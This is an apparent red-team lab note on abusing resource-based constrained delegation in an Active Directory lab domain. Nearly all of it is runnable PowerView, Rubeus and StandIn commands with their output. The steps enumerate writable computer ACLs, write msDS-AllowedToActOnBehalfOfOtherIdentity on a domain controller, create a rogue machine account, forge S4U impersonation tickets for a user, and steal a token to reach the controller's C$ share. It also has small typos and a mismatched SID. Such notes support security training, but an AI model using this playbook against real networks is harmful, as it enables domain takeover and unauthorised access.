> This abuse checks whether we have writing permissions on another computers (ACLs) and overwrites the msDS-AllowedToActOnBehalfOfOtherIdentity
> We need one of the following properties: WriteProperty, GenericAll, GenericWrite or WriteDacl

> This makes it much more likely to present itself as a privilege escalation / lateral movement opportunity

We need to things:

- A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity.
- Control of another principal that has an SPN.

In other words, Elevated access on ANY machine, and that elevated access must be with a user that is part of the group DEV\Developers, which is the group that has access WriteProperty on All

# First we query domain computers and read their ACL

```bash
powerview
powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io (on the DC)
ActiveDirectoryRights  : Self, WriteProperty # Looking at this one
ObjectAceType          : All (over all properties)
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000 (SID of object that is allowed)

```

# Check which group this is (we will need a user from this group to perform this attack)

```bash
powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
powerpick Get-DomainGroupMember -Identity Developers
```

---

# We then use the SID of our compromised Computer and add it to msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
# Get SID
powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
objectsid
---------
S-1-5-21-569305411-121244042-2357301523-1109

# Convert the content to  binary format
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)

# Update the value
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

# Next we use the WKSTN-2$ account to perform s4u impersonation

```bash
# Get tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Dump WKSTN-2$ ticket for krbtgt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Use that ticket to impersonate a user
exeute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

# Use the user tgs ticket for nlamb to start a process and store the token
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
steal_token 1234
```

---

# In case we did not have access to an SPN, we can create our own machine (of course we still need to be a user of Developers)

```bash
# Check if we can create Computers
powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

# Create a computer
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
    |_ Password : oIrpupAtF1YCXaw

# Calculate hash with computer password
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

# Use the aes256 hash to ask for a tgt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

# Use that ticket for s4u to impersonate a user
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

# Create a process with the received ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

# Steal token
steal_token 4092
ls \\dc-2.dev.cyberbotic.io\c$

```
